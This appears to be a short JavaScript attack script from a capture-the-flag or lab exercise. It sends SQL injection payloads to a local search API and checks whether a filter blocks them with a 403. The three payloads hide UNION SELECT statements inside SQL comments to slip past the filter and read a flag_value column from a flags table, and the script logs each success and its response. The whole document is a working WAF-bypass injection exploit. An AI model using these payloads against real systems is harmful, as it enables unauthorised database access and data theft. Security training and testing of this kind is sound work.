

const bypassSearch = async (payload) => {
    const res = await fetch(`http://localhost:4000/api/search?q=${encodeURIComponent(payload)}`);
    if (res.status !== 403) {
      console.log(`[SUCCESS] Payload: ${payload} | Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text}\n`);
    } else {
        console.log(`[BLOCKED] Payload: ${payload}`);
    }
};

const run = async () => {
    console.log("Testing search bypasses...");
    await bypassSearch("a'/*UNION*/SELECT 1, flag_value FROM flags--");
    await bypassSearch("a'/*UNION SELECT*/ 1, flag_value FROM flags--");
    await bypassSearch("a' UNION/*SELECT 1, flag_value FROM flags*/--");
};

run();
